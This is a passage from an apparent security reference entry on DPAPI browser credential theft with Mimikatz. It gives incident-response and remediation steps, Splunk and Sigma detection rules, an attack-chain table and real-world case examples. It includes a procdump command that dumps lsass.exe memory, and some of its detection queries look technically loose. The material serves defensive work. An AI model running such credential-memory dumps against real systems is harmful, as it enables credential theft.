procdump.exe -ma lsass.exe C:\Temp\lsass.dmp
procdump.exe -ma mimikatz.exe C:\Temp\mimikatz.dmp

# Collect Mimikatz artifacts
dir /a /s C:\Windows\Temp\*.txt C:\Users\*\Downloads\*.exe
```

**Manual:**
1. Open Event Viewer → Export Security log and DPAPI/Debug log to `.evtx` files.
2. Copy user's AppData directory for forensics (preserves DPAPI masterkey files).
3. Take bit-by-bit image of affected drive using forensic tools.

**3. Remediation:**

**Command:**
```cmd
# Reset all passwords for compromised users
net user compromised_user NewPassword123!

# Reset domain DPAPI backup key (Domain Admin only - CRITICAL operation)
# This invalidates ALL domain user masterkeys; requires password reset for all users
# Run on DC:
# (No built-in cmdlet; requires custom script or Mimikatz)

# Revoke all browser sessions
# In Chrome/Edge Settings → Clear browsing data → Cookies and cache

# Rotate Office 365 tokens (if Office 365 credentials were compromised)
# Portal.office.com → Sign out all other sessions

# Force password reset for affected users (90-day age policy)
# Then revoke all existing DPAPI masterkey files
# Users must re-authenticate on next login (regenerates masterkey)
```

**Manual:**
1. Reset password for compromised user via Active Directory.
2. Have user sign out of all cloud sessions (Teams, Outlook, SharePoint).
3. Force password change policy (all users must change password within 24 hours).
4. Trigger masterkey regeneration (happens automatically on password change).

**4. Monitoring & Hunting (Detect Similar Attacks):**

**Detection Query (Windows Event Viewer):**
```
Event ID: 4693 AND SubjectProcessId != "lsass" OR
Event ID: 16385 AND CallerProcessID != Chrome/Edge process ID
```

**Splunk Query:**
```spl
EventCode=4693 OR EventCode=16385 
| where CallerProcessID != "chrome.exe" AND CallerProcessID != "msedge.exe"
| stats count by CallerProcessID, user
| where count > 1  # Alert if suspicious process accessed DPAPI multiple times
```

**Sigma Rule (SIEM):**
```yaml
title: Suspicious DPAPI Access by Non-Browser Process
logsource:
    product: windows
    service: dpapi
detection:
    event_16385:
        EventID: 16385
        DataDescription: 
            - 'Google Chrome'
            - 'Microsoft Edge'
            - 'Brave'
    excluded_processes:
        CallerProcessID|re: '(chrome|msedge|brave)'
    condition: event_16385 AND NOT excluded_processes
action: alert
severity: high
```

---

## Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-AD-003] PowerView domain mapping | Attacker enumerates domain users and their machines |
| **2** | **Initial Access** | [IA-PHISH-001] Phishing / Credential harvesting | Attacker sends phishing email to user |
| **3** | **Privilege Escalation** | [PE-EXPLOIT-001] PrintNightmare or kernel exploit | Attacker gains local admin via vulnerability |
| **4** | **Credential Access** | **[CA-STORE-001] DPAPI credential decryption** | **Attacker extracts Chrome/Outlook credentials using Mimikatz** |
| **5** | **Lateral Movement** | [LM-AUTH-005] Use stolen credentials for RDP/SSH | Attacker accesses other machines using extracted passwords |
| **6** | **Collection** | Browser history, email, cloud files | Attacker accesses O365 email, SharePoint documents |
| **7** | **Impact** | Data exfiltration / ransomware deployment | Attacker steals sensitive data or encrypts files |

---

## Real-World Examples

### Example 1: Scattered Spider APT - DPAPI Browser Credential Theft (2023)

- **Target:** Enterprise IT helpdesk and network administrators
- **Timeline:** Compromised via phishing → local privilege escalation → DPAPI extraction
- **Technique Status:** ACTIVE - Confirmed use of Mimikatz DPAPI modules for browser credential theft
- **Impact:** Attacker impersonated IT staff via stolen email sessions; accessed corporate systems remotely
- **Reference:** [Scattered Spider CISA Advisory](https://www.cisa.gov/news-events/alerts/2023/10/23/cisa-lists-scattered-spider-incidents-escalating)

### Example 2: LockBit Ransomware Gang - DPAPI Credential Harvesting (2022-2024)

- **Target:** Multiple Fortune 500 companies
- **Timeline:** Initial compromise → lateral movement using DPAPI-extracted RDP passwords
- **Technique Status:** ACTIVE - Widely used for initial domain reconnaissance and lateral movement
- **Impact:** Extracted RDP credentials enabled rapid domain-wide compromise; ransomware deployed within hours
- **Reference:** [Red Canary: LockBit TTPs](https://redcanary.com/threat-detection-report/threats/lockbit/)

### Example 3: Forensic Investigation - Chrome DPAPI Extraction (2024)

- **Target:** Employee workstation in financial services
- **Timeline:** Insider threat investigation; employee's Chrome credentials were extracted
- **Technique Status:** Used by forensic investigator to validate potential data exfiltration
- **Impact:** Plaintext email passwords confirmed suspicious cloud file access
- **Reference:** [Digital Forensics: DPAPI Investigation](https://www.hackthebox.com/blog/seized-ca-ctf-2022-forensics-writeup)

---
